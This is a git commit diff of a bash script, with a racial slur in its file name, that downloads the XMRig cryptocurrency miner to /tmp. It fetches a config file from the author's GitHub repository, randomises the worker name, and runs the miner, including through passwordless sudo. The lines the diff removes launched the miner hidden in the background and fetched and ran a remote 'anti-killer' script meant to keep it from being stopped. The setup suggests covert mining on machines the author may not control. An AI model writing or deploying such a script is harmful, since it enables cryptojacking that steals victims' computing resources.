aebf93a1ba5ab30eb0139b83eb4d280538f029ca
gorguzaaaaz <sigmaboy182009@gmail.com>
2025-03-07 14:53:44 +0530

    Update textnigg.sh

--- textnigg.sh
+++ textnigg.sh
@@ -1,18 +1,21 @@
 #!/bin/bash
 
 xmrver="6.22.2"
-repo_url="https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main"
 
 if [ -d /tmp ]; then
     echo "/tmp exists"
 else
+    # create tmp if it doesn't exist (yes that happened...)
     sudo -n mkdir /tmp
     sudo -n chmod 777 /tmp
 fi
 
+# remove any aliases
 unalias -a
+
+# try to install wget and util-linux
 sudo -n apt update
-sudo -n apt install -y wget util-linux dos2unix
+sudo -n apt install -y wget util-linux
 sudo -n apk add wget util-linux
 sudo -n dnf install wget util-linux
 
@@ -23,23 +26,21 @@ else
 fi
 
 mkdir -p /tmp/xmrig
+# run the script in /tmp/xmrig, after the script checks if it exists or not
 cd /tmp/xmrig
 
+# use curl because it's present on more distributions
 $DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v$xmrver/xmrig-$xmrver-linux-static-x64.tar.gz
 tar -xf xmrig-$xmrver-linux-static-x64.tar.gz
 cd xmrig-$xmrver
+
+# just to be extra safe
 chmod +x xmrig
 
 rm -f config.json
-$DOWNLOAD_CMD $repo_url/config.json
-dos2unix config.json
+$DOWNLOAD_CMD https://raw.githubusercontent.com/gorguzaaaaz/kerala/refs/heads/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/kasm/kasm-$randnum/g" config.json
 
-nohup ./xmrig > /dev/null 2>&1 &
-
-# Anti-Kill Protection Start
-wget -qO /tmp/anti-killer.sh $repo_url/anti-killer.sh
-chmod +x /tmp/anti-killer.sh
-dos2unix /tmp/anti-killer.sh
-nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
+sudo -n ./xmrig
+./xmrig
